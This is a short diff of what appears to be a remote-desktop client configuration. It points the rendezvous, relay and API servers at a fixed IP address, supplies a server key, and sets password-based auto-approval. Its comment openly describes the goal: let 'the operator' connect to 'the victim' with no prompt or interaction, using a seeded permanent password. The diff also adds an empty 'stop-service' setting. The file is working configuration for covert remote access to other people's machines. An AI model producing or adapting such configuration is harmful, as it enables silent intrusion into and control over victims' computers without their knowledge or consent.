@@ -4,10 +4,11 @@
 [options]
 custom-rendezvous-server = '64.58.102.35'
 relay-server = '64.58.102.35'
-api-server = 'http://64.58.102.35'
+api-server = 'http://64.58.102.35:21321'
 key = 'g+F3JrK5xDNIfk99C829T7VFhCw4RSo0Ct4llTgVbbQ='
 
 # Unattended behavior: auto-accept any connection that supplies the correct password, so
 # there is no "Accept connection?" prompt or manual click on the victim. Combined with the
 # seeded permanent password, the operator connects with no interaction on the client side.
 approve-mode = 'password'
+stop-service = ''
